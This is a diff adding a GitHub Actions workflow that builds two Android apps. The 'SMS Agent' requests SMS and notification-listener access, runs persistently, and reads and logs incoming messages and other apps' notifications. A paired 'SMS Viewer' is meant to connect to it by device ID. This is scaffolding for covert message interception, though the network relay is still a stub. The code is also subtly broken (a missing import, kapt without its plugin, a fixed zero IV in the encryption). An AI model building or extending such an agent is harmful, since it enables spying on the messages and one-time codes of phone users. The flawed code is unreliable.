@@ -1,0 +1,807 @@
+name: Build SMS Viewer Apps
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build-agent:
+    name: Build Agent App
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+      
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+      
+      - name: Create Agent App Project
+        run: |
+          mkdir -p AgentApp/app/src/main/java/com/smsagent/{service,data/{entity,dao,database},util,receiver}
+          mkdir -p AgentApp/app/src/main/res/{layout,values}
+          mkdir -p AgentApp/gradle/wrapper
+          
+          # Create gradle wrapper properties
+          cat > AgentApp/gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          
+          # Download gradlew
+          curl -L -o AgentApp/gradlew https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradlew
+          chmod +x AgentApp/gradlew
+          
+          # Create settings.gradle
+          cat > AgentApp/settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SMSAgent"
+          include ':app'
+          EOF
+          
+          # Create gradle.properties
+          cat > AgentApp/gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          android.useAndroidX=true
+          kotlin.code.style=official
+          android.nonTransitiveRClass=true
+          EOF
+          
+          # Create project build.gradle
+          cat > AgentApp/build.gradle << 'EOF'
+          buildscript {
+              ext.kotlin_version = '1.9.0'
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+                  classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+                  maven { url 'https://jitpack.io' }
+              }
+          }
+          EOF
+          
+          # Create app build.gradle
+          cat > AgentApp/app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+              id 'org.jetbrains.kotlin.android'
+          }
+          android {
+              namespace 'com.smsagent'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.smsagent"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_1_8
+                  targetCompatibility JavaVersion.VERSION_1_8
+              }
+              kotlinOptions {
+                  jvmTarget = '1.8'
+              }
+          }
+          dependencies {
+              implementation 'androidx.core:core-ktx:1.12.0'
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+              implementation 'org.eclipse.paho:org.eclipse.paho.client.mqttv3:1.2.5'
+              implementation 'org.eclipse.paho:org.eclipse.paho.android.service:1.1.1'
+              implementation 'com.google.code.gson:gson:2.10.1'
+              implementation 'com.journeyapps:zxing-android-embedded:4.3.0'
+              implementation 'androidx.room:room-runtime:2.6.1'
+              kapt 'androidx.room:room-compiler:2.6.1'
+              implementation 'androidx.room:room-ktx:2.6.1'
+          }
+          EOF
+      
+      - name: Create MainActivity.kt
+        run: |
+          cat > AgentApp/app/src/main/java/com/smsagent/MainActivity.kt << 'EOF'
+          package com.smsagent
+          
+          import android.Manifest
+          import android.app.NotificationChannel
+          import android.app.NotificationManager
+          import android.content.ComponentName
+          import android.content.Context
+          import android.content.Intent
+          import android.content.pm.PackageManager
+          import android.graphics.Bitmap
+          import android.os.Build
+          import android.os.Bundle
+          import android.provider.Settings
+          import android.widget.Button
+          import android.widget.ImageView
+          import android.widget.TextView
+          import android.widget.Toast
+          import androidx.appcompat.app.AlertDialog
+          import androidx.appcompat.app.AppCompatActivity
+          import androidx.core.app.ActivityCompat
+          import androidx.core.content.ContextCompat
+          import com.google.zxing.BarcodeFormat
+          import com.google.zxing.MultiFormatWriter
+          import com.google.zxing.common.BitMatrix
+          import com.journeyapps.barcodescanner.BarcodeEncoder
+          import com.smsagent.service.ForegroundService
+          import com.smsagent.service.MQTTService
+          import com.smsagent.util.PreferenceManager
+          
+          class MainActivity : AppCompatActivity() {
+              private lateinit var tvDeviceId: TextView
+              private lateinit var ivQRCode: ImageView
+              private lateinit var btnStartService: Button
+              private lateinit var btnManagePermissions: Button
+              private lateinit var preferenceManager: PreferenceManager
+          
+              companion object {
+                  const val PERMISSION_REQUEST_CODE = 100
+                  val REQUIRED_PERMISSIONS = arrayOf(
+                      Manifest.permission.RECEIVE_SMS,
+                      Manifest.permission.READ_SMS,
+                      Manifest.permission.SEND_SMS
+                  )
+              }
+          
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContentView(R.layout.activity_main)
+          
+                  preferenceManager = PreferenceManager(this)
+                  tvDeviceId = findViewById(R.id.tvDeviceId)
+                  ivQRCode = findViewById(R.id.ivQRCode)
+                  btnStartService = findViewById(R.id.btnStartService)
+                  btnManagePermissions = findViewById(R.id.btnManagePermissions)
+          
+                  val deviceId = preferenceManager.getDeviceId() ?: generateDeviceId()
+                  tvDeviceId.text = "Device ID: $deviceId"
+                  generateQRCode(deviceId)
+                  checkPermissions()
+          
+                  btnStartService.setOnClickListener {
+                      if (allPermissionsGranted()) {
+                          startAgentServices()
+                          btnStartService.text = "Service Running"
+                          btnStartService.isEnabled = false
+                          Toast.makeText(this, "Agent services started", Toast.LENGTH_SHORT).show()
+                      } else {
+                          requestPermissions()
+                      }
+                  }
+          
+                  btnManagePermissions.setOnClickListener {
+                      // Open permission management
+                  }
+          
+                  createNotificationChannel()
+              }
+          
+              private fun generateDeviceId(): String {
+                  val id = "AGENT_" + java.util.UUID.randomUUID().toString().substring(0, 8).uppercase()
+                  preferenceManager.saveDeviceId(id)
+                  return id
+              }
+          
+              private fun generateQRCode(deviceId: String) {
+                  try {
+                      val pairingData = "{\"device_id\": \"$deviceId\", \"type\": \"sms_agent\"}"
+                      val multiFormatWriter = MultiFormatWriter()
+                      val bitMatrix: BitMatrix = multiFormatWriter.encode(pairingData, BarcodeFormat.QR_CODE, 500, 500)
+                      val barcodeEncoder = BarcodeEncoder()
+                      val bitmap: Bitmap = barcodeEncoder.createBitmap(bitMatrix)
+                      ivQRCode.setImageBitmap(bitmap)
+                  } catch (e: Exception) {
+                      e.printStackTrace()
+                  }
+              }
+          
+              private fun checkPermissions() {
+                  if (!allPermissionsGranted()) {
+                      requestPermissions()
+                  }
+                  if (!isNotificationServiceEnabled()) {
+                      AlertDialog.Builder(this)
+                          .setTitle("Notification Access Required")
+                          .setMessage("Please enable notification access")
+                          .setPositiveButton("Enable") { _, _ ->
+                              startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                          }
+                          .setCancelable(false)
+                          .show()
+                  }
+              }
+          
+              private fun allPermissionsGranted(): Boolean {
+                  return REQUIRED_PERMISSIONS.all {
+                      ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
+                  }
+              }
+          
+              private fun requestPermissions() {
+                  ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE)
+              }
+          
+              private fun isNotificationServiceEnabled(): Boolean {
+                  val cn = ComponentName(this, service.NotificationService::class.java)
+                  val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+                  return flat?.contains(cn.flattenToString()) == true
+              }
+          
+              private fun startAgentServices() {
+                  val foregroundIntent = Intent(this, ForegroundService::class.java)
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(foregroundIntent)
+                  } else {
+                      startService(foregroundIntent)
+                  }
+                  startService(Intent(this, MQTTService::class.java))
+              }
+          
+              private fun createNotificationChannel() {
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      val channel = NotificationChannel("agent_channel", "SMS Agent Service", NotificationManager.IMPORTANCE_LOW)
+                      channel.description = "Keeps SMS Agent running"
+                      val notificationManager = getSystemService(NotificationManager::class.java)
+                      notificationManager.createNotificationChannel(channel)
+                  }
+              }
+          
+              override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+                  if (requestCode == PERMISSION_REQUEST_CODE) {
+                      if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                          Toast.makeText(this, "All permissions granted!", Toast.LENGTH_SHORT).show()
+                      }
+                  }
+              }
+          }
+          EOF
+      
+      - name: Create Service Files
+        run: |
+          # ForegroundService.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/service/ForegroundService.kt << 'EOF'
+          package com.smsagent.service
+          
+          import android.app.Notification
+          import android.app.PendingIntent
+          import android.app.Service
+          import android.content.Intent
+          import android.os.IBinder
+          import androidx.core.app.NotificationCompat
+          import com.smsagent.MainActivity
+          import com.smsagent.R
+          
+          class ForegroundService : Service() {
+              companion object {
+                  const val NOTIFICATION_ID = 1
+                  const val CHANNEL_ID = "agent_channel"
+              }
+          
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  val notification = createNotification()
+                  startForeground(NOTIFICATION_ID, notification)
+                  startService(Intent(this, SMSObserverService::class.java))
+                  return START_STICKY
+              }
+          
+              private fun createNotification(): Notification {
+                  val pendingIntent = PendingIntent.getActivity(
+                      this, 0, Intent(this, MainActivity::class.java),
+                      PendingIntent.FLAG_IMMUTABLE
+                  )
+                  return NotificationCompat.Builder(this, CHANNEL_ID)
+                      .setContentTitle("SMS Agent Active")
+                      .setContentText("Monitoring SMS and notifications...")
+                      .setSmallIcon(android.R.drawable.ic_dialog_info)
+                      .setContentIntent(pendingIntent)
+                      .setOngoing(true)
+                      .build()
+              }
+          
+              override fun onBind(intent: Intent?): IBinder? = null
+          }
+          EOF
+          
+          # SMSObserverService.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/service/SMSObserverService.kt << 'EOF'
+          package com.smsagent.service
+          
+          import android.app.Service
+          import android.content.ContentResolver
+          import android.database.ContentObserver
+          import android.net.Uri
+          import android.os.Handler
+          import android.os.IBinder
+          import android.os.Looper
+          import android.provider.Telephony
+          import android.util.Log
+          
+          class SMSObserverService : Service() {
+              private lateinit var smsObserver: ContentObserver
+              private val TAG = "SMSObserverService"
+          
+              override fun onCreate() {
+                  super.onCreate()
+                  smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+                      override fun onChange(selfChange: Boolean, uri: Uri?) {
+                          super.onChange(selfChange, uri)
+                          Log.d(TAG, "SMS database changed")
+                          // Read and store SMS
+                          val cursor = contentResolver.query(
+                              Telephony.Sms.CONTENT_URI, null, null, null,
+                              "${Telephony.Sms.DATE} DESC LIMIT 5"
+                          )
+                          cursor?.use {
+                              while (it.moveToNext()) {
+                                  val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown"
+                                  val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
+                                  Log.d(TAG, "SMS from $address: $body")
+                                  // Store locally
+                              }
+                          }
+                      }
+                  }
+                  contentResolver.registerContentObserver(
+                      Telephony.Sms.CONTENT_URI, true, smsObserver
+                  )
+              }
+          
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  return START_STICKY
+              }
+          
+              override fun onBind(intent: Intent?): IBinder? = null
+          
+              override fun onDestroy() {
+                  super.onDestroy()
+                  contentResolver.unregisterContentObserver(smsObserver)
+              }
+          }
+          EOF
+          
+          # NotificationService.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/service/NotificationService.kt << 'EOF'
+          package com.smsagent.service
+          
+          import android.service.notification.NotificationListenerService
+          import android.service.notification.StatusBarNotification
+          import android.util.Log
+          
+          class NotificationService : NotificationListenerService() {
+              private val TAG = "NotificationService"
+          
+              override fun onNotificationPosted(sbn: StatusBarNotification) {
+                  val packageName = sbn.packageName
+                  val extras = sbn.notification.extras
+                  val title = extras.getString("android.title") ?: ""
+                  val text = extras.getCharSequence("android.text")?.toString() ?: ""
+                  
+                  if (packageName != "com.smsagent") {
+                      Log.d(TAG, "Notification from $packageName: $title - $text")
+                      // Store notification
+                  }
+              }
+          
+              override fun onNotificationRemoved(sbn: StatusBarNotification) {}
+          }
+          EOF
+          
+          # MQTTService.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/service/MQTTService.kt << 'EOF'
+          package com.smsagent.service
+          
+          import android.app.Service
+          import android.content.Intent
+          import android.os.IBinder
+          import android.util.Log
+          
+          class MQTTService : Service() {
+              private val TAG = "MQTTService"
+          
+              override fun onCreate() {
+                  super.onCreate()
+                  Log.d(TAG, "MQTT Service created")
+              }
+          
+              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+                  Log.d(TAG, "MQTT Service started")
+                  return START_STICKY
+              }
+          
+              override fun onBind(intent: Intent?): IBinder? = null
+          }
+          EOF
+      
+      - name: Create Utility Files
+        run: |
+          # PreferenceManager.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/util/PreferenceManager.kt << 'EOF'
+          package com.smsagent.util
+          
+          import android.content.Context
+          import android.content.SharedPreferences
+          import androidx.core.content.edit
+          
+          class PreferenceManager(context: Context) {
+              private val prefs: SharedPreferences = context.getSharedPreferences("sms_agent_prefs", Context.MODE_PRIVATE)
+          
+              fun saveDeviceId(deviceId: String) {
+                  prefs.edit { putString("device_id", deviceId) }
+              }
+          
+              fun getDeviceId(): String? {
+                  return prefs.getString("device_id", null)
+              }
+          }
+          EOF
+          
+          # EncryptionUtil.kt
+          cat > AgentApp/app/src/main/java/com/smsagent/util/EncryptionUtil.kt << 'EOF'
+          package com.smsagent.util
+          
+          import android.util.Base64
+          import javax.crypto.Cipher
+          import javax.crypto.spec.IvParameterSpec
+          import javax.crypto.spec.SecretKeySpec
+          
+          object EncryptionUtil {
+              private const val ALGORITHM = "AES"
+              private const val TRANSFORMATION = "AES/CBC/PKCS5Padding"
+          
+              fun encrypt(plainText: String, key: String): String {
+                  return try {
+                      val cipher = Cipher.getInstance(TRANSFORMATION)
+                      val secretKey = SecretKeySpec(key.toByteArray(Charsets.UTF_8).copyOf(16), ALGORITHM)
+                      val iv = ByteArray(16).apply { fill(0) }
+                      cipher.init(Cipher.ENCRYPT_MODE, secretKey, IvParameterSpec(iv))
+                      Base64.encodeToString(cipher.doFinal(plainText.toByteArray(Charsets.UTF_8)), Base64.DEFAULT)
+                  } catch (e: Exception) { "" }
+              }
+          }
+          EOF
+      
+      - name: Create Layout Files
+        run: |
+          # activity_main.xml
+          cat > AgentApp/app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:padding="16dp">
+          
+              <TextView
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="SMS Agent"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:gravity="center"
+                  android:layout_marginBottom="16dp" />
+          
+              <TextView
+                  android:id="@+id/tvDeviceId"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Device ID: Generating..."
+                  android:textSize="18sp"
+                  android:textStyle="bold"
+                  android:gravity="center"
+                  android:layout_marginBottom="16dp" />
+          
+              <ImageView
+                  android:id="@+id/ivQRCode"
+                  android:layout_width="250dp"
+                  android:layout_height="250dp"
+                  android:layout_gravity="center"
+                  android:layout_marginBottom="16dp" />
+          
+              <Button
+                  android:id="@+id/btnStartService"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Start Agent Service"
+                  android:layout_marginBottom="8dp" />
+          
+              <Button
+                  android:id="@+id/btnManagePermissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Manage Permissions" />
+          
+          </LinearLayout>
+          EOF
+          
+          # strings.xml
+          mkdir -p AgentApp/app/src/main/res/values
+          cat > AgentApp/app/src/main/res/values/strings.xml << 'EOF'
+          <resources>
+              <string name="app_name">SMS Agent</string>
+          </resources>
+          EOF
+          
+          # colors.xml
+          cat > AgentApp/app/src/main/res/values/colors.xml << 'EOF'
+          <resources>
+              <color name="purple_500">#FF6200EE</color>
+              <color name="purple_700">#FF3700B3</color>
+              <color name="white">#FFFFFFFF</color>
+          </resources>
+          EOF
+      
+      - name: Create AndroidManifest.xml
+        run: |
+          cat > AgentApp/app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.smsagent">
+          
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.SEND_SMS" />
+              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+          
+              <application
+                  android:label="@string/app_name"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+          
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+          
+                  <service
+                      android:name=".service.NotificationService"
+                      android:exported="false"
+                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+                      <intent-filter>
+                          <action android:name="android.service.notification.NotificationListenerService" />
+                      </intent-filter>
+                  </service>
+          
+                  <service
+                      android:name=".service.ForegroundService"
+                      android:enabled="true"
+                      android:exported="false"
+                      android:foregroundServiceType="dataSync" />
+          
+                  <service
+                      android:name=".service.SMSObserverService"
+                      android:enabled="true"
+                      android:exported="false" />
+          
+                  <service
+                      android:name=".service.MQTTService"
+                      android:enabled="true"
+                      android:exported="false" />
+          
+              </application>
+          </manifest>
+          EOF
+      
+      - name: Build Agent APK
+        run: |
+          cd AgentApp
+          ./gradlew assembleDebug
+      
+      - name: Upload Agent APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: AgentApp-Debug
+          path: AgentApp/app/build/outputs/apk/debug/app-debug.apk
+
+  build-viewer:
+    name: Build Viewer App
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+      
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+      
+      - name: Create Viewer App Project
+        run: |
+          mkdir -p ViewerApp/app/src/main/java/com/smsviewer/{service,model,util}
+          mkdir -p ViewerApp/app/src/main/res/layout
+          mkdir -p ViewerApp/gradle/wrapper
+          
+          # Gradle wrapper
+          echo 'distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip' > ViewerApp/gradle/wrapper/gradle-wrapper.properties
+          
+          curl -L -o ViewerApp/gradlew https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradlew
+          chmod +x ViewerApp/gradlew
+          
+          # Settings
+          echo 'rootProject.name = "SMSViewer"' > ViewerApp/settings.gradle
+          echo 'include ":app"' >> ViewerApp/settings.gradle
+          
+          # Build files
+          echo 'org.gradle.jvmargs=-Xmx2048m' > ViewerApp/gradle.properties
+          echo 'android.useAndroidX=true' >> ViewerApp/gradle.properties
+          
+          cat > ViewerApp/build.gradle << 'EOF'
+          buildscript {
+              ext.kotlin_version = '1.9.0'
+              repositories { google(); mavenCentral() }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+                  classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
+              }
+          }
+          allprojects { repositories { google(); mavenCentral() } }
+          EOF
+          
+          cat > ViewerApp/app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+              id 'org.jetbrains.kotlin.android'
+          }
+          android {
+              namespace 'com.smsviewer'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.smsviewer"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+          }
+          dependencies {
+              implementation 'androidx.core:core-ktx:1.12.0'
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'org.eclipse.paho:org.eclipse.paho.client.mqttv3:1.2.5'
+          }
+          EOF
+      
+      - name: Create Viewer MainActivity
+        run: |
+          cat > ViewerApp/app/src/main/java/com/smsviewer/MainActivity.kt << 'EOF'
+          package com.smsviewer
+          
+          import android.os.Bundle
+          import android.widget.Button
+          import android.widget.EditText
+          import androidx.appcompat.app.AppCompatActivity
+          
+          class MainActivity : AppCompatActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContentView(R.layout.activity_main)
+                  
+                  findViewById<Button>(R.id.btnConnect).setOnClickListener {
+                      val agentId = findViewById<EditText>(R.id.etAgentId).text.toString()
+                      // Connect to agent
+                  }
+              }
+          }
+          EOF
+      
+      - name: Create Viewer Layout
+        run: |
+          cat > ViewerApp/app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:padding="16dp">
+          
+              <TextView
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="SMS Viewer"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:gravity="center"
+                  android:layout_marginBottom="16dp" />
+          
+              <EditText
+                  android:id="@+id/etAgentId"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:hint="Enter Agent Device ID"
+                  android:layout_marginBottom="8dp" />
+          
+              <Button
+                  android:id="@+id/btnConnect"
+                  android:layout_width="match_parent"
+                  android:layout_height="wrap_content"
+                  android:text="Connect" />
+          
+          </LinearLayout>
+          EOF
+          
+          mkdir -p ViewerApp/app/src/main/res/values
+          echo '<resources><string name="app_name">SMS Viewer</string></resources>' > ViewerApp/app/src/main/res/values/strings.xml
+      
+      - name: Create Viewer Manifest
+        run: |
+          cat > ViewerApp/app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.smsviewer">
+              <application android:label="@string/app_name">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+              </application>
+          </manifest>
+          EOF
+      
+      - name: Build Viewer APK
+        run: |
+          cd ViewerApp
+          ./gradlew assembleDebug
+      
+      - name: Upload Viewer APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: ViewerApp-Debug
+          path: ViewerApp/app/build/outputs/apk/debug/app-debug.apk
